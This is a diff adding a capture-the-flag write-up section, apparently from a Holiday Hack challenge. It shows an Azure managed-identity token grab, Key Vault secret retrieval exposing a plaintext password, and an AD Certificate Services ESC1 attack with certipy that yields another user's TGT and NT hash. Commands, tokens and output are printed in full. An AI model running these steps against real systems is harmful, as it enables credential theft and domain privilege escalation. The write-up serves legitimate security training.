@@ -716,7 +716,206 @@ into your badge for GLORY!
 
 ## Objective: Active Directory
 
+Generate access token for the vault [Get Secret - Get Secret - REST API (Azure Key Vault) | Microsoft Learn](https://learn.microsoft.com/en-us/rest/api/keyvault/secrets/get-secret/get-secret?view=rest-keyvault-secrets-7.4&tabs=HTTP)
 
+```bash
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
+```
+
+Output
+
+```bash
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI0MjAwNjUsIm5iZiI6MTcwMjQyMDA2NSwiZXhwIjoxNzAyNTA2NzY1LCJhaW8iOiJFMlZnWU9EMjZpcjVzZTVYYmNlYW5xWmpjLy9mQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoic0hGUFkwa0VIVVdwQ2Y1cms2TjNBQSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.PgMpcAu0q7PlrkjMRRoSab8CWzl3hKr8_LO25lgekxKRZWyd5gjXWl3KTBXdRra5NQH7SmDJCFQBH1mm00q3hrA1LQn-KKGtFr3BsCBlfZkFwYsetzBR-lLft3TjDVQQWTC4nlivsO0WBlnPXt3CVJXJCElboPievCkKb8ATRJcVY2wZAr-eBEoIXWxW60UCSiTTTHaoGbMmC7cO88xUQHGi8m8gRXfz7dHmw3ji8CdUYrIcqBZQmZFqR_pR38pCZbikmx77JrsCgg-VE3bCfJwyAJtbnSc_OV3XopcrFoIfxAaIqtxkV8dBH4mh4rAGu-LqjZ4BkQ29XxDbgdoI_g","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"84871","expires_on":"1702506765","ext_expires_in":"86399","not_before":"1702420065","resource":"https://vault.azure.net","token_type":"Bearer"}
+```
+
+Store token in $accesskey
+
+```bash
+accesskey="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI0MjAwNjUsIm5iZiI6MTcwMjQyMDA2NSwiZXhwIjoxNzAyNTA2NzY1LCJhaW8iOiJFMlZnWU9EMjZpcjVzZTVYYmNlYW5xWmpjLy9mQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoic0hGUFkwa0VIVVdwQ2Y1cms2TjNBQSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.PgMpcAu0q7PlrkjMRRoSab8CWzl3hKr8_LO25lgekxKRZWyd5gjXWl3KTBXdRra5NQH7SmDJCFQBH1mm00q3hrA1LQn-KKGtFr3BsCBlfZkFwYsetzBR-lLft3TjDVQQWTC4nlivsO0WBlnPXt3CVJXJCElboPievCkKb8ATRJcVY2wZAr-eBEoIXWxW60UCSiTTTHaoGbMmC7cO88xUQHGi8m8gRXfz7dHmw3ji8CdUYrIcqBZQmZFqR_pR38pCZbikmx77JrsCgg-VE3bCfJwyAJtbnSc_OV3XopcrFoIfxAaIqtxkV8dBH4mh4rAGu-LqjZ4BkQ29XxDbgdoI_g"
+```
+
+Let's find our vault using the $result token from earlier
+
+```bash
+curl -X GET   "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?$filter=resourceType&api-version=2015-11-01"   -H "Authorization: Bearer $result"
+```
+
+Output formatted in JSON
+
+```json
+{
+  "value": [
+    {
+      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
+      "name": "northpole-it-kv",
+      "type": "Microsoft.KeyVault/vaults",
+      "location": "eastus",
+      "tags": {}
+    },
+    {
+      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
+      "name": "northpole-ssh-certs-kv",
+      "type": "Microsoft.KeyVault/vaults",
+      "location": "eastus",
+      "tags": {}
+    }
+  ]
+}
+
+```
+
+Access secrets in the vault
+
+```bash
+curl -s "https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $accesskey"
+```
+
+Output
+
+```json
+{
+  "value": [
+    {
+      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
+      "attributes": {
+        "enabled": true,
+        "created": 1699564823,
+        "updated": 1699564823,
+        "recoveryLevel": "Recoverable+Purgeable",
+        "recoverableDays": 90
+      },
+      "tags": {}
+    }
+  ],
+  "nextLink": null
+}
+
+```
+
+Let's take a peek at that file
+
+```bash
+curl -s "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4" -H "Authorization: Bearer $accesskey"
+```
+
+Output 
+
+```json
+{
+  "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",
+  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
+  "attributes": {
+    "enabled": true,
+    "created": 1699564823,
+    "updated": 1699564823,
+    "recoveryLevel": "Recoverable+Purgeable",
+    "recoverableDays": 90
+  },
+  "tags": {}
+}
+
+```
+
+Storing the password for elfy in a variable to make it easier
+
+```bash
+password='J4`ufC49/J4766'
+```
+
+Let's see what other users we can identify in AD
+
+```bash
+./GetADUsers.py  -all northpole.local/elfy:$password -dc-ip 10.0.0.53
+```
+
+Output
+
+```
+Name                  Email                           PasswordLastSet      LastLogon           
+--------------------  ------------------------------  -------------------  -------------------
+alabaster                                             2023-12-12 02:03:10.009431  2023-12-12 21:26:35.106729 
+Guest                                                 <never>              <never>             
+krbtgt                                                2023-12-12 02:11:42.348154  <never>             
+elfy                                                  2023-12-12 02:13:45.650140  2023-12-12 21:18:50.936250 
+wombleycube                                           2023-12-12 02:13:45.759558  2023-12-12 23:21:41.208709 
+```
+
+Let's enumerate certificate templates
+
+```
+certipy find -u elfy@northpole.local -p $password -dc-ip 10.0.0.53
+```
+
+Let's see if any templates allow an unprivileged user to enroll
+
+```bash
+cat 20231212232257_Certipy.json | grep "Users"
+```
+
+Output
+
+```bash
+         "NORTHPOLE.LOCAL\\Authenticated Users"
+      "Template Name": "NorthPoleUsers",
+      "Display Name": "NorthPoleUsers",
+            "NORTHPOLE.LOCAL\\Domain Users",
+        "ESC1": "'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication"
+            "NORTHPOLE.LOCAL\\Domain Users",
+            "NORTHPOLE.LOCAL\\Domain Users",
+            "NORTHPOLE.LOCAL\\Domain Users",
+            "NORTHPOLE.LOCAL\\Domain Users",
+
+```
+
+Let's generate a cert and priv key for wombleycube
+
+```bash
+certipy req -u 'elfy@northpole.local' -p $password -dc-ip 10.0.0.53 -target 'npdc01.northpole.local' -ca 'northpole-npdc01-CA' -template 'NorthPoleUsers' -upn 'wombleycube@northpole.local'
+```
+
+Output
+
+```
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 148
+[*] Got certificate with UPN 'wombleycube@northpole.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'wombleycube.pfx'
+```
+
+Let's try to auth with our new cert
+
+```bash
+certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53
+```
+
+Output
+
+```bash
+*] Using principal: wombleycube@northpole.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'wombleycube.ccache'
+[*] Trying to retrieve NT hash for 'wombleycube'
+[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
+```
+
+Let's enumerate computers to find our potential file share
+
+```bash
+net.py elfy:$password@10.0.0.53 computer
+```
+
+Output
+
+```
+[*] Enumerating computers ..
+  1. npdc01$
+
+```
+
+ 
 
 
 
